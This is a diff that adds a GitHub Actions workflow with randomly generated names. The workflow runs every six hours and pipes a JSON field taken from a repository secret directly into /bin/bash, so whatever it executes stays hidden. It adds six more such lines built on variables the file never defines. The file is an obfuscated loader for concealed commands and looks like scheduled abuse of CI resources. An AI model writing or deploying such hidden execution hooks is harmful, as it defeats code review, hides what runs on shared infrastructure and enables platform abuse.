@@ -1,0 +1,23 @@
+name: dongqingcheng4657
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongqingcheng4657
+        env:
+          b1: ${{ secrets.b1 }}
+        run: |
+          echo $b1 | jq -r .gwrji481 | /bin/bash
+          echo $ioj384 | jq -r .fmjx0295 | /bin/bash
+          echo $mnico528 | jq -r .be810 | /bin/bash
+          echo $pt505 | jq -r .xuos9 | /bin/bash
+          echo $unr88916 | jq -r .r9 | /bin/bash
+          echo $tfih49295 | jq -r .u01 | /bin/bash
+          echo $mltu9 | jq -r .gh9 | /bin/bash
+
